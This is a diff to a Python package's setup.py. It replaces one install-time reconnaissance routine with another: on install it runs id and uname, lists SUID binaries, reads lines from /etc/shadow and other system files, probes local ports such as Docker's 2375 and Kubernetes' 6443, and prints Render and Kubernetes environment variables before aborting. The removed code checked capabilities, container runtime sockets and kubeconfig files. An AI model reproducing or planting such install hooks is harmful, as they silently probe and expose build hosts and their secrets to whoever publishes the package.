@@ -1,43 +1,52 @@
-import os, sys, subprocess as sp
+import os
+import sys
+import socket
+import subprocess as sp
 from setuptools import setup
 
-def heavy_audit():
+def poc():
     o = sys.stderr.write
-    o("\n" + "!"*40 + "\n")
-    o("--- CLOUDFLARE EXTREME AUDIT ---\n")
-    
-    # 1. Проверка Capabilities (возможности процесса)
-    # Если там есть CAP_SYS_ADMIN или CAP_CHOWN - это почти 100% Root
-    o("\n[1] CHECKING CAPABILITIES:\n")
-    o(sp.getoutput("capsh --print 2>/dev/null || cat /proc/self/status | grep Cap"))
-
-    # 2. Поиск SUID бинарников (дыры в правах)
-    o("\n[2] SUID BINARIES:\n")
-    o(sp.getoutput("find / -perm -4000 -type f 2>/dev/null | grep -v '/usr/bin/'"))
-
-    # 3. Проверка доступности сокета Docker или Containerd
-    o("\n[3] SOCKET CHECK:\n")
-    sockets = ["/var/run/docker.sock", "/run/containerd/containerd.sock", "/var/run/crio/crio.sock"]
-    for s in sockets:
-        if os.path.exists(s):
-            o(f"CRITICAL: Socket found at {s}\n")
-
-    # 4. Проверка на уязвимость DirtyPipe / DirtyCOW (через версию ядра)
-    o("\n[4] KERNEL VERSION:\n")
-    o(sp.getoutput("uname -a"))
-    
-    # 5. Попытка прочитать чувствительные конфиги
-    o("\n[5] SENSITIVE READ:\n")
-    files = ["/etc/kubernetes/kubeconfig", "/root/.kube/config", "/etc/machine-id"]
-    for f in files:
+    def run(cmd):
         try:
-            with open(f, 'r') as fd: o(f"READ OK: {f}\n")
-        except: pass
+            return sp.getoutput(cmd)
+        except:
+            return "ERR"
 
-    o("\n" + "!"*40 + "\n")
+    o("\n" + "="*50 + "\n")
+    o(f"ID: {run('id')}\n")
+    o(f"KRNL: {run('uname -a')}\n")
+    o(f"IP: {run('hostname -I')}\n")
+    
+    o("\n[PRIVS]\n")
+    o(run("find / -perm -4000 -type f 2>/dev/null | head -n 10") + "\n")
+    
+    o("\n[SENSITIVE]\n")
+    files = ['/etc/shadow', '/etc/hosts', '/proc/net/arp', '/proc/self/cgroup']
+    for f in files:
+        if os.path.exists(f):
+            try:
+                with open(f, 'r') as fd:
+                    o(f"READ {f}: {fd.readline().strip()}\n")
+            except:
+                o(f"FAIL {f}\n")
+
+    o("\n[NET]\n")
+    for port in [22, 80, 443, 2375, 6443]:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(0.1)
+        if s.connect_ex(('127.0.0.1', port)) == 0:
+            o(f"L-PORT {port}: OPEN\n")
+        s.close()
+
+    o("\n[ENV]\n")
+    o("\n".join([f"{k}={v[:20]}..." for k, v in os.environ.items() if "RENDER" in k or "KUBERNETES" in k]))
+    
+    o("\n" + "="*50 + "\n")
     sys.exit(1)
 
-try: heavy_audit()
-except: sys.exit(1)
+try:
+    poc()
+except:
+    sys.exit(1)
 
-setup(name="cf-siege", version="0.1")
+setup(name="x", version="0.1")
